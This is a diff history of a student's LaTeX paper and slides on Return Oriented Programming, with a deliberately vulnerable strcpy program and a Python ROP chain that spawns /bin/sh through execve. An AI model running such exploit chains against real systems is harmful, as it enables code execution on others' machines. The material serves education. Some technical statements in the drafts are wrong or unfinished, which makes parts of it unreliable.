+%%%% NOTES:
+% - Change "journal=tosc" to "journal=tches" if needed
+% - Change "submission" to "final" for final version
+% - Add "spthm" for LNCS-like theorems
+
+%%%% 2. PACKAGES %%%%
+\usepackage{lipsum} % Example package -- can be removed
+\usepackage{blt}
+
+%%%% 3. AUTHOR, INSTITUTE %%%%
 \author{Maximilian Heim}
-\title{Exploring Return Oriented Programming}
+\institute{
+  University Albstadt-Sigmaringen, Albstadt, Germany, \email{MaximilianHeim@protonmail.com}
+}
+%%%% NOTES:
+% - We need a city name for indexation purpose, even if it is redundant
+%   (eg: University of Atlantis, Atlantis, Atlantis)
+% - \inst{} can be omitted if there is a single institute,
+%   or exactly one institute per author
+
+%%%% 4. TITLE %%%%
+\title{Return Oriented Programming}
+%%%% NOTES:
+% - If the title is too long, or includes special macro, please
+%   provide a "running title" as optional argument: \title[Short]{Long}
+% - You can provide an optional subtitle with \subtitle.
+
 \begin{document}
+
 \maketitle
-\section{Abstract}
+
+%%%% 5. KEYWORDS %%%%
+\keywords{ROP \and Return Oriented Programming \and Buffer Overflow \and Binary Exploitation}
+
+%%%% 6. ABSTRACT %%%%
+\begin{abstract}
+  In this paper we introduce the concept of Return Oriented Programming, how to apply it, how to protect against it and show a concrete attack.
+\end{abstract}
+
+%%%% 7. PAPER CONTENT %%%%
 \section{Introduction}
-\section{Conclusion}
-\bibliography{bib.bib}
+
+Return Oriented Programming is a type of buffer overflow attack that has been published in 2007 and ever since has become a widely known buffer overflow technique.
+It has been developed to circumvent the NX-BIT protection that protects the stack from being executed.
+At the time of writing this paper modern techniques like Stack Carnaries and ASLR prevent these attacks from being practical but there are millions of running systems using old hard-, firm- and software that is possibly vulnerable to these kinds of buffer overflow attacks.
+Return Oriented Programming is based on chaining return addresses to code just before a return and therefor allowing almost arbitrary code segments to be chained.
+
+\section{Gadgets}
+\label{sec:main}
+Gadgets are code segments that sit before a \Verb+ret+ instruction, that is an instruction that uses the address on the stack to return to a previous stack frame and therefor a previous level in the call hierarchy.
+This means we can arbitrarily chain these gadgets and achieve arbitary code execution if we find gadgets for our purpose.
+A gadget can be found by searching for \Verb+0x80+ Bytes in the program.
+The instructions before then represent the code we can use, for that we need the address of the gadget.
+We could do this manually or use one of the many tools available, to name a few there is ropper, ROPgadget and pwntools.
+For this paper i will be using ROPgadget since i found it easy to use and fast.
+Using the following command under Arch Linux we can dump all gadgets to a file and search in it using regular expressions.
+\bltCommand{}
+
+\section{Target Program}
+\paragraph{Target Program}
+The following program is the target of our attack, it uses an argument for the buffer overflow, using vulnerable input functions also works, though.
+\bltCode{vuln.c}{c}{The Target Program}{thetargetprogram}
+
+\paragraph{Compilation}
+We use the following command to compile the target program
+\bltCommand{compilation.sh}{The compliation command}{thecompilationcommand}
+
+\section{Attack}
+
+\section{Results}
+
+\section{Protection}
+
+\section{Discussion}
+
+%%%% 8. BILBIOGRAPHY %%%%
+\bibliographystyle{alpha}
+\bibliography{abbrev3,crypto,biblio}
+%%%% NOTES
+% - Download abbrev3.bib and crypto.bib from https://cryptobib.di.ens.fr/
+% - Use bilbio.bib for additional references not in the cryptobib database.
+%   If possible, take them from DBLP.
+
 \end{document}

### 2023-02-11 paper.tex
changes

@@
 \label{sec:main}
+\paragraph{Introduction}
 Gadgets are code segments that sit before a \Verb+ret+ instruction, that is an instruction that uses the address on the stack to return to a previous stack frame and therefor a previous level in the call hierarchy.
 This means we can arbitrarily chain these gadgets and achieve arbitary code execution if we find gadgets for our purpose.
-A gadget can be found by searching for \Verb+0x80+ Bytes in the program.
+
+\paragraph{How to find Gadgets}
+A gadget can be found by searching for \Verb+0xC3+ Bytes in the program.
 The instructions before then represent the code we can use, for that we need the address of the gadget.
-We could do this manually or use one of the many tools available, to name a few there is ropper, ROPgadget and pwntools.
-For this paper i will be using ROPgadget since i found it easy to use and fast.
+We could do this manually using tools like \Verb+objdump+, \Verb+hexdump+ or use one of the many tools available, to name a few there is \Verb+ropper+, \Verb+ROPgadget+ and \Verb+pwntools+.
+For this paper i will be using \Verb+ROPgadget+ since i found it easy to use and fast.
 Using the following command under Arch Linux we can dump all gadgets to a file and search in it using regular expressions.
-\bltCommand{}
-
+\paragraph{Finding gadgets using ROPgadget}
+\bltCommand{ropcommand.sh}{Dumping all gadgets into a file}{dumpallgadgets}
+this produces an output with results like these.
+\bltResult{dumppick}{Output of ROPgadget}{outputropgadget}
+These are only 10 Lines out of the 8244 lines found by the tool though.
+It is clearly visible that many candidates for ROP can be found, even in a file with a relatively small size of 72 kB.
+Though most of these gadgets are not all that useful because they often modify a lot of registers, possibly messing up the desired state or using a fixed return address.
+In most cases we can find suitable candidates using resular expressions though.
+\paragraph{Useful gadgets for exploits}
+\subparagraph{pop}
+\subparagraph{mov}
+\subparagraph{arithmetics}
+\subparagraph{int}
+\paragraph{Filtering the gadgets}
+We can use the tools directly or use the desired gadgets using regular expressions.
+In order to make this paper more general and easy to replicate i will be using regular expressions to find the desired gadgets.
 \section{Target Program}

### 2023-02-11 presentation.tex
changes

@@
         \item Most of them are not very useful because they are very specific, amount compensates for that 716 kB binary $\rightarrow$ 34011 Gadgets
-        \item Example 1: pop edx $\rightarrow$ \regex{\^{}.\{0,10\}pop edx ;.\{0,10\}ret}
-        \item Example 2: int 0x80 $\rightarrow$ \regex{\^{}.\{0,10\}int 0x80}
-        \item Example 3: xor eax, eax $\rightarrow$ \regex{\^{}.\{0,10\}xor eax, eax ;.\{0,10\}ret}
+        \item Example 1: pop edx $\rightarrow$ \bltRegex{\^{}.\{0,10\}pop edx ;.\{0,10\}ret}
+        \item Example 2: int 0x80 $\rightarrow$ \bltRegex{\^{}.\{0,10\}int 0x80}
+        \item Example 3: xor eax, eax $\rightarrow$ \bltRegex{\^{}.\{0,10\}xor eax, eax ;.\{0,10\}ret}
     \end{itemize}

### 2023-02-11 ropcommand.sh

@@ -1,1 +1,1 @@
-ROPgadget --binary vuln > gadgets
+ROPgadget --binary ./vuln --nojop > gadgets

### 2023-02-12 paper.tex
changes

@@
 \usepackage{blt}
+\usepackage{tabularx}
+\usepackage{url}
 
@@
 For this paper i will be using \Verb+ROPgadget+ since i found it easy to use and fast.
-Using the following command under Arch Linux we can dump all gadgets to a file and search in it using regular expressions.
+Using the following command~\cref{dumpallgadgets} under Linux we can dump all gadgets to a file and search in it using regular expressions, \Verb+ROPgadget+ can be found in most package managers or can be downloaded directly from \url{https://github.com/JonathanSalwan/ROPgadget}.
 \paragraph{Finding gadgets using ROPgadget}
 \bltCommand{ropcommand.sh}{Dumping all gadgets into a file}{dumpallgadgets}
-this produces an output with results like these.
+Using this command produces an output with results similar theseto this.
 \bltResult{dumppick}{Output of ROPgadget}{outputropgadget}
-These are only 10 Lines out of the 8244 lines found by the tool though.
+These are only 10 Lines out of the 8244 lines found by the tool though and i purposefully filtered out some good and bad ones for demonstration.
 It is clearly visible that many candidates for ROP can be found, even in a file with a relatively small size of 72 kB.
-Though most of these gadgets are not all that useful because they often modify a lot of registers, possibly messing up the desired state or using a fixed return address.
-In most cases we can find suitable candidates using resular expressions though.
+Though most of these gadgets are not all that useful because they often modify a lot of registers, possibly messing up the desired state or use a fixed return address.
+In most cases we can find suitable candidates using resular expressions though, this will be demonstrated later in this section.
 \paragraph{Useful gadgets for exploits}
 \subparagraph{pop}
+Pop allows us to write arbitrary values into registers.
+For that we search for an \Verb+pop <reg>+ instruction inside our gadgets, in the payload we can then place the value after the address of the pop instruction.
+If we can not find a suitable gadget we can try to get creative and achieve the desired state another way.
+If for example we want to write some value into ecx we could use something like this: \Verb+xor ecx, ecx ; pop eax ; xor ecx, eax+.
+Provided that we have these gadgets available.
 \subparagraph{mov}
+Mov allows us to write arbitrary values into memory.
+For that we search for an \Verb+mov dword ptr [<reg1>], <reg2>+ instruction inside our gadgets, we can then, in combination with two pops write arbitrary values at arbitary memory locations, we could use something like this to accomplish that: \Verb+pop ecx ; pop eax ; mov dword ptr [eax], ecx+
 \subparagraph{arithmetics}
@@
 We can use the tools directly or use the desired gadgets using regular expressions.
-In order to make this paper more general and easy to replicate i will be using regular expressions to find the desired gadgets.
+In order to make this paper more general and easy to replicate i will be using regular expressions to find the desired gadgets
+\paragraph{Gadgets and their corresponding Regular Expression}
+The following table describes what regex we can use to find the gadgets needed for the attack.
+
+\begin{itemize}
+\item pop edx  $\rightarrow$ \bltRegex{\^{}.\{0,20\}pop edx.\{0,20\}ret\\n}
+
+\item int 0x80  $\rightarrow$ \bltRegex{\^{}.\{0,20\}int 0x80}
+
+\item xor eax, eax  $\rightarrow$ \bltRegex{\^{}.\{0,20\}xor eax, eax.\{0,20\}ret\\n} 
+\end{itemize}
+
+for all of these regular expressions i was able to find at least a few suitable candidates.
+If there arent any results the amount of possible characters before or after the gadget can be increased until results show up.
+It is however desirable to have gadgets with as few and noninterfering instructions as possible, if this is accomplished we can almost use the instructions we found like in assembly.
+Gadgets which do multiple things at once however can mess up the desired state and break the payload so it is important to thoroughly analyze the gadgets before using them.
 \section{Target Program}
 \paragraph{Target Program}
-The following program is the target of our attack, it uses an argument for the buffer overflow, using vulnerable input functions also works, though.
+The following program is the target of our attack, it uses a command line argument to provide the payload and \Verb+strcpy+ for the buffer overflow, overwriting the return address after the 8 Byte buffer.
+Using vulnerable input functions also works though.
 \bltCode{vuln.c}{c}{The Target Program}{thetargetprogram}
@@
 \section{Attack}
+The attack consists of several phases
+\begin{enumerate}
+  \item Specify concrete goal
+  \item Generate desired list of instructions and arguments (abstract payload)
+  \item Extract gadgets using tools
+  \item Search gadgets for instructions
+  \item Generate payload using the gadgets according to the the abstract payload while making sure gadgets dont interfere with our desired program state.
+This step can be done using Python which we will show in a later section~\cref{howtopack}
+  \item Insert payload into target
+\end{enumerate}
 
+\paragraph{struct.pack}
+\Verb+struct.pack+ is a Python function that allows to easily generate our desired payload from the raw bytes, in bash we can then pipe the generated payload into our target
+\bltCode{pack.py}{python}{How to use struct.pack}{howtopack}
 \section{Results}

### 2023-02-12 pack.py

@@ -1,0 +1,4 @@
+from struct import pack
+p = 'AAAABBBBCCCC'
+p += str(pack('<I', 0x0802840)
+print(p)

### 2023-02-12 paper.tex
changes

@@
 \section{Introduction}
-
+BIBLIOGRAFIE NICHT VERGESSEN
 Return Oriented Programming is a type of buffer overflow attack that has been published in 2007 and ever since has become a widely known buffer overflow technique.
@@
 \bltCommand{ropcommand.sh}{Dumping all gadgets into a file}{dumpallgadgets}
-Using this command produces an output with results similar theseto this.
+Using this command produces an output with results similar to this.
 \bltResult{dumppick}{Output of ROPgadget}{outputropgadget}
@@
 Though most of these gadgets are not all that useful because they often modify a lot of registers, possibly messing up the desired state or use a fixed return address.
-In most cases we can find suitable candidates using resular expressions though, this will be demonstrated later in this section.
-\paragraph{Useful gadgets for exploits}
-\subparagraph{pop}
+In most cases we can find suitable candidates using regular expressions though, this will be demonstrated later in this section.
+\paragraph{Overview of powerful gadgets}
+\paragraph{pop}
 Pop allows us to write arbitrary values into registers.
-For that we search for an \Verb+pop <reg>+ instruction inside our gadgets, in the payload we can then place the value after the address of the pop instruction.
+For that we search for a \Verb+pop <reg>+ instruction inside our gadgets, in the payload we can then place the value after the address of the pop instruction.
 If we can not find a suitable gadget we can try to get creative and achieve the desired state another way.
@@
 Provided that we have these gadgets available.
-\subparagraph{mov}
+\paragraph{mov}
 Mov allows us to write arbitrary values into memory.
-For that we search for an \Verb+mov dword ptr [<reg1>], <reg2>+ instruction inside our gadgets, we can then, in combination with two pops write arbitrary values at arbitary memory locations, we could use something like this to accomplish that: \Verb+pop ecx ; pop eax ; mov dword ptr [eax], ecx+
-\subparagraph{arithmetics}
-\subparagraph{int}
-\paragraph{Filtering the gadgets}
-We can use the tools directly or use the desired gadgets using regular expressions.
-In order to make this paper more general and easy to replicate i will be using regular expressions to find the desired gadgets
+For that we search for a \Verb+mov dword ptr [<reg1>], <reg2>+ instruction inside our gadgets, we can then, in combination with two pops write arbitrary values at arbitary memory locations, we could use something like this to accomplish that: \Verb+pop ecx ; pop eax ; mov dword ptr [eax], ecx+
+\paragraph{arithmetics, boolean algebra}
+Arithmetic operations like add, sub, inc, xor, or, and can be useful to bring registers into our desired state.
+For that we search for the corresponding gadget with the required operands.
+For example xor can be used to clear a register or copy its contents.
+It often occurs in the following forms: \Verb+xor eax, eax+ or \Verb+xor eax, edx+.
+The first case clears the register since xor computes an anti equivalence, formally $a \oplus a = 0$ and the second one copies the value of the 2nd operand into the 1st operand when the target register is \Verb+0x00+ since \Verb+0x00+ is the neutral element of the xor operation, formally $a \oplus 0 = a$.
+\paragraph{int}
+Int stand for a system interrupt which causes a system call to be executed.
+System calls are kernelspace programs that require higher privileges than what is available in a userspace program.
+Examples for system calls include io and \Verb+execve+ which allows to execute arbitary programs.
+In combination with pop, mov and other instructions we can specify the concrete system call.
+One of the most powerful system calls for blackhats is bash since it allows permanently implementing malware or gain insight into files.
+\subsection{Filtering the gadgets}
+\paragraph{Introduction}
+In order to find the gadgets we want we can use the tools directly or we can use regular expressions.
+In order to make this paper more general and easy to replicate i will be using regular expressions to find the desired gadgets.
 \paragraph{Gadgets and their corresponding Regular Expression}
@@
 for all of these regular expressions i was able to find at least a few suitable candidates.
-If there arent any results the amount of possible characters before or after the gadget can be increased until results show up.
+If there are no results the amount of possible characters before or after the gadget can be increased until results show up.
 It is however desirable to have gadgets with as few and noninterfering instructions as possible, if this is accomplished we can almost use the instructions we found like in assembly.
 Gadgets which do multiple things at once however can mess up the desired state and break the payload so it is important to thoroughly analyze the gadgets before using them.
-\section{Target Program}
+
+\section{Attack}
+\subsection{Target Program}
 \paragraph{Target Program}
@@
 
-\section{Attack}
+\subsection{Phases of developing the attack}
+\paragraph{Phases}
 The attack consists of several phases
 \begin{enumerate}
-  \item Specify concrete goal
+  \item Specify concrete goal with required program state and instructions
   \item Generate desired list of instructions and arguments (abstract payload)
@@
 
+\paragraph{Goal and abstract payload}
+After specifying the goal and possibly simplifying it we have to write a list of instructions and arguments that achieve the goal, for this its favorable to directly use the format of the final payload except for using instructions instead of addresses as this will then allow to simply insert the found gadgets into this abstract payload.
+\paragraph{Extract and search gadgets}
+After extracting the gadgets using one of the above mentioned methods we can search for gadgets
+
+As described above you should
+
 \paragraph{struct.pack}
-\Verb+struct.pack+ is a Python function that allows to easily generate our desired payload from the raw bytes, in bash we can then pipe the generated payload into our target
+\Verb+struct.pack+ is a Python function that allows to easily generate our desired payload from the raw bytes.
+Bash then allows to directly pipe the generated payload into our target.
+In order to generate the payload we first have to fill the buffer and override the EBP with arbitary values as seen in line 2~\cref{howtopack}.
+This is usually done using easily recognizable characters, using the letter \Verb+A+ for this is common.
+It has the hex value \Verb+0x41+, doing this allows then to spot the buffer in a debugger like \Verb+gdb+.
+So in this example we fill the buffer with 8 \Verb+A+'s and 4 \Verb+B+'s.
+After that it is time to insert the addresses of the gadgets and the arguments.
+This is done by calling pack with the double word (64 Bit) while specifying the endianness, converting that to a string and adding it to the string as seen in line 3~\cref{howtopack}.
+After the whole payload has been generated we can print it and use the output directly for running the buffer overflow attack as mentioned above.
 \bltCode{pack.py}{python}{How to use struct.pack}{howtopack}

### 2023-02-13 presentation.tex
changes

--- 2023-02-11 presentation.tex
@@
     \begin{itemize}
-    \item A type of attack that exploits buffer overruns
+    \item A type of attack that exploits buffer overruns in which we chain addresses of instructions right before returns.
     \item Arised as a technique to counter security mechanisms (NX)
-    \item Research by Hovav Shacham et al in 2007 - "When good instructions go bad: generalizing return-oriented programming to RISC"
-    \item Blackhat conference 2008, Hovav Shacham - "Return-oriented Programming:
-    Exploitation without Code Injection" \url{https://hovav.net/ucsd/talks/blackhat08.html}
-    \item Paper published by Ryan Roemer, Erik Buchanan, Hovav Shacham and Stefan Savage in 2012 - "Return-Oriented Programming: Systems, Languages, and Applications" 
-    \item Big binary $\rightarrow$ ROP is turing complete
+    \item Research by Hovav Shacham et al in 2007, in 2008 the attack got demonstrated at Blackhat 2008 - "Return-oriented Programming: Exploitation without Code Injection" \url{https://hovav.net/ucsd/talks/blackhat08.html}
     \item Many authors refer to ret-to-libc/library as ROP, according to the founder of this technique it has to be differentiated and ROP describes chaining of small code segments
@@
     \end{itemize}
-    \begin{figure}[h]
-        \caption{ROP Gadgets}
-        \centering
-        \includegraphics[width=0.8\textwidth]{./img/gadget.png}\label{gadget}
-    \end{figure}
+    \bltResult{dumppick2}{Output of ROPgadget}{outputropgadget}
 
@@
 \begin{lstlisting}[style=result]
-mov [rax], rxc; ret;
+mov [eax], ecx; ret;
 \end{lstlisting}
@@
 \begin{lstlisting}[style=result]
-mov rax, [rxc]; ret;
+mov eax, [ecx]; ret;
 \end{lstlisting}
@@
     \begin{itemize}
-        \item Most of them are not very useful because they are very specific, amount compensates for that 716 kB binary $\rightarrow$ 34011 Gadgets
-        \item Example 1: pop edx $\rightarrow$ \regex{\^{}.\{0,10\}pop edx ;.\{0,10\}ret}
-        \item Example 2: int 0x80 $\rightarrow$ \regex{\^{}.\{0,10\}int 0x80}
-        \item Example 3: xor eax, eax $\rightarrow$ \regex{\^{}.\{0,10\}xor eax, eax ;.\{0,10\}ret}
+        \item Most of them are not very useful because they are very specific, but the amount compensates for that. 716 kB binary $\rightarrow$ 8236 Gadgets
+        \item pop edx $\rightarrow$ \bltRegex{\^{}.\{0,20\}pop edx.\{0,20\}ret\textbackslash{}n}
+        \item int 0x80 $\rightarrow$ \bltRegex{\^{}.\{0,20\}int 0x80}
+        \item xor eax, eax $\rightarrow$ \bltRegex{\^{}.\{0,20\}xor eax, eax.\{0,20\}ret\textbackslash{}n}
     \end{itemize}
@@
     \frametitle{Target Program and Compliation}
-    \bltCode{vuln.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
+    \bltCode{vuln_args.c}{c}{Target Program (stack protectors must be off)}{targetprogram}
     \bltCommand{compilation.sh}{Compilation command}{comp}
@@
 \begin{frame}[fragile]
-    \frametitle{Generating the payload, writing /bin}
+    \frametitle{Generating the payload, defining all gadgets}
     \begin{lstlisting}[style=code, language=python]
 from struct import pack
-
-p = 'AAAABBBBCCCC'
-p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack\('<I', 0x080f0f6c) # @ .data
-p += str(pack\('<I', 0x00000000) # @ NULL
-p += str(pack\('<I', 0x080b526a) # pop eax ; ret
-p += '/bin'
-p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+import os
+data = 0x080e3020
+xor_eax_eax = 0x0804e234 # xor eax, eax ; ret
+pop_eax = 0x080ac96a # pop eax ; ret
+pop_ebx = 0x08049022 # pop ebx ; ret
+pop_ecx = 0x0807f9a3 # pop ecx ; ret
+pop_edx = 0x0807f133 # pop edx ; and eax, 0xe850fffd ; ret
+inc_eax = 0x0809fc6e # inc eax ; ret
+int_80 = 0x080499c2 # int 0x80
+mov_edx_eax = 0x0804eed2 # mov dword ptr [edx], eax ; ret
+filler = 0x11111111
+# Padding goes here
+p = bytes('AAAAAAAABBBB', 'ascii')
     \end{lstlisting}
@@
 \begin{frame}[fragile]
-    \frametitle{Generating the payload, writing //sh}
+    \frametitle{Generating the payload, writing /bin//sh}
     \begin{lstlisting}[style=code, language=python]
-p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack\('<I', 0x080f0f70) # @ .data + 4
-p += str(pack\('<I', 0x00000000) # @ NULL
-p += str(pack\('<I', 0x080b526a) # pop eax ; ret
-p += '//sh'
-p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
+p += pack('<I', pop_edx) # write address of .data into edx
+p += pack('<I', data)
+p += pack('<I', pop_eax) # write /bin into eax
+p += bytes('/bin', 'ascii')
+p += pack('<I', mov_edx_eax) # mov to .data
+p += pack('<I', pop_edx) # address of .data + 4 into edx
+p += pack('<I', data + 4)
+p += pack('<I', pop_eax) # //sh into eax
+p += bytes('//sh', 'ascii')
+p += pack('<I', mov_edx_eax) # mov to .data
     \end{lstlisting}
@@
     \begin{lstlisting}[style=code, language=python]
-# write null byte after /bin/sh
-p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack\('<I', 0x080f0f74) # @ .data + 8
-p += str(pack\('<I', 0x00000000) # @ NULL
-p += str(pack\('<I', 0x080506c0) # xor eax, eax ; ret
-p += str(pack\('<I', 0x08059402) # mov dword ptr [edx], eax ; ret
-# write address of /bin/sh to ebx
-p += str(pack\('<I', 0x08049022) # pop ebx ; ret
-p += str(pack\('<I', 0x080f0f6c) # @ .data
-# arguments and environment to ecx,edx
-p += str(pack\('<I', 0x0805e64f) # pop ecx; add al, 0xf6; ret;
-p += str(pack\('<I', 0x080f0f74) # @ .data + 8
-p += str(pack\('<I', 0x080958b5) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack\('<I', 0x080f0f74) # @ .data + 8
-p += str(pack\('<I', 0x00000000) # @ NULL
+p += pack('<I', pop_edx) # address of .data + 8 into edx
+p += pack('<I', data + 8)
+p += pack('<I', xor_eax_eax) # clear eax
+p += pack('<I', mov_edx_eax) # write null after /bin/sh
+p += pack('<I', pop_ebx) # write address of program name to ebx
+p += pack('<I', data)
+p += pack('<I', pop_ecx) # write arguments into ecx
+p += pack('<I', data + 8)
+p += pack('<I', pop_edx) # write env into edx
+p += pack('<I', data + 8)
     \end{lstlisting}
@@
 \begin{frame}[fragile]
-    \frametitle{Generating the payload, init params, syscall}
+    \frametitle{Generating the payload: Init eax, call syscall}
     \begin{lstlisting}[style=code, language=python]
-p += str(pack\('<I', 0x080506c0) # xor eax, eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08082a9e) # inc eax ; ret
-p += str(pack\('<I', 0x08049b2a) # int 0x80
-print p
+p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
+for i in range(12):
+    p += pack('<I', inc_eax)
+p += pack('<I', int_80) # call interrupt
+print(str(p)[2:-1])
+with open('payload', 'wb') as file:
+    file.write(p)
     \end{lstlisting}
@@
 
-\section*{Appendix}
-\subsection*{Proof that ROP is Turing Complete}
-\begin{frame}
-    \frametitle{Proof that ROP is Turing Complete}
-    What is turing completeness? \url{https://en.wikipedia.org/wiki/Turing_completeness}
-    Refer to proof from \url{https://drwho.virtadpt.net/files/mov.pdf} that x86 MOV itself is turing complete, from that we can conclude that mov, with access to the pop instruction is enough to make ROP itself turing complete.
-\end{frame}
-
 \end{document}

### 2023-02-13 compilation.sh

@@ -1,1 +1,1 @@
-clang -o vuln vuln.c -m32 -fno-stack-protector -Wl,-z,relro,-z,now,-z -static
+gcc -o vuln -g -m32 -D_FORTIFY_SOURCE=0 -fno-pie -fno-stack-protector -static vuln.c

### 2023-02-13 payload.py

@@ -1,44 +1,51 @@
 from struct import pack
- 
-data = 0x080e5010
+import os
+data = 0x080e3020
+xor_eax_eax = 0x0804e234 # xor eax, eax ; ret
+pop_eax = 0x080ac96a # pop eax ; ret
+pop_ebx = 0x08049022 # pop ebx ; ret
+pop_ecx = 0x0807f9a3 # pop ecx ; ret
+pop_edx = 0x0807f133 # pop edx ; and eax, 0xe850fffd ; ret
+inc_eax = 0x0809fc6e # inc eax ; ret
+int_80 = 0x080499c2 # int 0x80
+mov_edx_eax = 0x0804eed2 # mov dword ptr [edx], eax ; ret
+filler = 0x11111111
 # Padding goes here
-p = 'AAAABBBBCCCC'
+p = bytes('AAAAAAAABBBB', 'ascii')
  
-p += str(pack('<I', 0x0808b285)) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack('<I', data)) # @ .data
-p += str(pack('<I', 0x11111111)) # @ NULL
-p += str(pack('<I', 0x080b526a)) # pop eax ; ret
-p += '/bin'
-p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
-p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack('<I', data + 4)) # @ .data + 4
-p += str(pack('<I', 0x11111111)) # @ NULL
-p += str(pack('<I', 0x080b526a)) # pop eax ; ret
-p += '//sh'
-p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
-p += str(pack('<I', 0x080958b5)) # pop edx; xor eax, eax; pop edi; ret;
-p += str(pack('<I', data + 8)) # @ .data + 8
-p += str(pack('<I', 0x11111111)) # @ NULL
-p += str(pack('<I', 0x080506c0)) # xor eax, eax ; ret
-p += str(pack('<I', 0x08059402)) # mov dword ptr [edx], eax ; ret
-p += str(pack('<I', 0x08049022)) # pop ebx ; ret
-p += str(pack('<I', data)) # @ .data
-p += str(pack('<I', 0x0805e64f)) # pop ecx; add al, 0xf6; ret;
-p += str(pack('<I', data + 8)) # @ .data + 8
[…]

### 2023-02-13 vuln_args.c

@@ -3,7 +3,10 @@
 
 int main(int argc, char *argv[]) {
   char buffer[8] = {0};
-  printf("Please enter your name:");
-  scanf("%s", buffer);
+  if (argc != 2) {
+    printf("A single argument is required.\n");
+    return 1;
+  }
+  strcpy(buffer, argv[1]);
   return 0;
 }

### 2023-02-13 presentation.tex
changes

@@
         \item These allow us to write arbitrary values into registers
-        \item However, sometimes we do not find a pop into our desired register (e.g. r14), here we can improvise and use something like
+        \item Sometimes we dont find a desired pop, we can improvise. E.g. for r14:
     \end{itemize}
@@
 \begin{frame}[fragile]
-    \frametitle{Useful gadgets: Systemcalls, arithmetics}
+    \frametitle{Useful gadgets: Arithmetics}
     \begin{itemize}
-        \item add, sub, div, xor, mul, div\ldots allow us to manipulate register contents
-        \item Since programs run in userspace we have limited privileges, if we can find systemcalls we can, in combination with the arithmetic operations and pop instructions call arbitrary system calls
+        \item add, sub, xor \ldots allow us to manipulate register contents
+        \item Programs run in userspace with limited privileges, systemcalls allow to execute operations which require higher privileges.
     \end{itemize}

### 2023-02-13 presentation.tex
changes

@@
     \begin{itemize}
-    \item A type of attack that exploits buffer overruns in which we chain addresses of instructions right before returns.
-    \item Arised as a technique to counter security mechanisms (NX)
-    \item Research by Hovav Shacham et al in 2007, in 2008 the attack got demonstrated at Blackhat 2008 - "Return-oriented Programming: Exploitation without Code Injection" \url{https://hovav.net/ucsd/talks/blackhat08.html}
-    \item Many authors refer to ret-to-libc/library as ROP, according to the founder of this technique it has to be differentiated and ROP describes chaining of small code segments
+    \item A type of attack that exploits buffer overruns. Makes use of existent instructions in the program.
+    \item Arised as a technique to counter security mechanisms (NX).
+    \item Research by Hovav Shacham et al in 2007, in 2008 the attack got demonstrated at Blackhat - "Return-oriented Programming: Exploitation without Code Injection" \url{https://hovav.net/ucsd/talks/blackhat08.html}
+    \item Many authors refer to ret-to-libc/library as ROP, according to the founder of this technique it has to be differentiated. Chaining code segments vs calling function.
     \end{itemize}
@@
         \item Generate a list of these gadgets, called ROP chain
-        \item Generate a payload with the addresses of these gadgets
-        \item Insert payload via buffer overrun
+        \item Generate a payload with the addresses of these gadgets and the parameters
+        \item Insert payload via buffer overrun vulnerability
     \end{enumerate} 
@@
         \item Gadgets are machine instructions that end on a return
+        \item Most of them are not very useful because they are very specific, but the amount compensates for that. 716 kB binary $\rightarrow$ 8236 Gadgets
         \item Tools: ROPgadget (\url{https://github.com/JonathanSalwan/ROPgadget}), ropper (\url{https://github.com/sashs/Ropper}), Radare2, pwntools....
@@
 \begin{frame}[fragile]
-    \frametitle{Useful gadgets: Arithmetics}
+    \frametitle{Useful gadgets: Arithmetics, System calls}
     \begin{itemize}
-        \item add, sub, xor \ldots allow us to manipulate register contents
-        \item Programs run in userspace with limited privileges, systemcalls allow to execute operations which require higher privileges.
+        \item Artihmetics: add, xor, inc \ldots allow us to manipulate register contents
+        \item System calls: Programs run in userspace with limited privileges, system calls allow to execute operations which require higher privileges.
     \end{itemize}
@@
     \end{figure}
-\end{frame}
-
-\section{How to find suitable Gadgets?}
-\begin{frame}
-    \frametitle{How to find suitable Gadgets?}
-    \begin{itemize}
-    \item Multiple methods, using the tools directly you can search gadgets of your liking, but we can also dump them into a file and search using regular expressions.
-    \end{itemize}
-    \bltCommand{ropcommand.sh}{Dumping Gadgets}{dumpgadget}
-    \begin{itemize}
-        \item Most of them are not very useful because they are very specific, but the amount compensates for that. 716 kB binary $\rightarrow$ 8236 Gadgets
-        \item pop edx $\rightarrow$ \bltRegex{\^{}.\{0,20\}pop edx.\{0,20\}ret\textbackslash{}n}
-        \item int 0x80 $\rightarrow$ \bltRegex{\^{}.\{0,20\}int 0x80}
-        \item xor eax, eax $\rightarrow$ \bltRegex{\^{}.\{0,20\}xor eax, eax.\{0,20\}ret\textbackslash{}n}
-    \end{itemize}
 \end{frame}
@@
             \item write /bin/sh into memory (at the data segment)
-            \item init systemcall number (11)
-            \item init systemcall argument (address of /bin//sh)
+            \item init systemcall number (11 in eax)
+            \item init systemcall arguments (address of /bin//sh in ebx, args and env in ecx and edx)
             \item call systemcall

### 2023-02-14 presentation.tex
changes

@@
 \begin{lstlisting}[style=result]
-int 0x80; ret;
+int 0x80;
 \end{lstlisting}
@@
 p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
-for i in range(12):
+for i in range(11):
     p += pack('<I', inc_eax)

### 2023-02-15 paper.tex
changes

@@
 \paragraph{arithmetics, boolean algebra}
